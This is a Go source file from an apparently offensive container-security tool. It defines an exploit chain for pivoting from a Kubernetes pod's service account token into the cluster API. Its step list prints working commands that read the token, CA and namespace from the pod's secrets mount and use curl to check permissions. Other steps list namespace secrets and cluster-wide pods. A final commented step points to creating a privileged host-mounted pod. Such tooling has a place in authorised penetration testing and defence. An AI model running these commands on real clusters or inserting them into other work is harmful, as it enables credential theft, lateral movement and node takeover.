package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// k8sSaPivot — once a SA token is reachable AND the API server is
// reachable, the workload becomes a starting point for in-cluster
// lateral movement. The chain prints kubectl-equivalent curl invocations
// rather than asking the user to install kubectl.
type k8sSaPivot struct{ exploit.Base }

func (c *k8sSaPivot) Matches(results []check.Result) *exploit.Match {
	if !exploit.HasFailedID(results, "k8s.sa.token") {
		return nil
	}
	if !exploit.HasFailedID(results, "k8s.api.reachable") {
		return nil
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"k8s.sa.token", "k8s.api.reachable"},
		Optional:   []string{"k8s.token.decoded"},
		Confidence: "high",
	}
}

func (c *k8sSaPivot) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title: "Pull token, ca, namespace into env vars",
			Command: `T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
echo "namespace: $NS, api: $API"`,
			Note: "These four are the only things you need.",
		},
		{
			Title: "Self-review: what can this SA do?",
			Command: `curl -sk --cacert "$CA" -H "Authorization: Bearer $T" \
    "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
    -X POST -H 'Content-Type: application/json' \
    -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"`,
			Note: "Mirrors `kubectl auth can-i --list` without needing kubectl installed.",
		},
		{
			Title: "List secrets in this namespace (if RBAC allows)",
			Command: `curl -sk --cacert "$CA" -H "Authorization: Bearer $T" \
    "$API/api/v1/namespaces/$NS/secrets"`,
			Note: "Frequently the goal: secrets are how SA-to-SA escalation tends to play out.",
		},
		{
			Title: "List pods cluster-wide (if RBAC allows)",
			Command: `curl -sk --cacert "$CA" -H "Authorization: Bearer $T" \
    "$API/api/v1/pods"`,
			Note: "If this works, you have a cluster-wide read; check for sensitive env in pod specs.",
		},
		{
			Title: "Try to create a privileged pod (DESTRUCTIVE)",
			Command: `# Only with explicit authorisation. Not run by default.
# kubectl auth can-i create pods --as system:serviceaccount:$NS:$(...)
# Then craft a pod with hostPID:true + privileged:true + volume hostPath: /`,
			Note: "Skipped by default; left as a comment so you remember it's the next step.",
		},
	}
}

func init() {
	exploit.Register(&k8sSaPivot{Base: exploit.Base{
		IDValue:       "chain.k8s_sa_pivot",
		NameValue:     "ServiceAccount token → API enumeration",
		GoalValue:     "Use the in-pod SA token + API reachability to enumerate the cluster.",
		RiskValue:     exploit.RiskActiveRead,
		SeverityValue: check.SeverityHigh,
		ReferencesValue: []string{
			"https://kubernetes.io/docs/reference/access-authn-authz/authorization/#checking-api-access",
			"https://github.com/inguardians/peirates",
		},
		AttackValue: []string{"T1552/007", "T1078/004"},
	}})
}
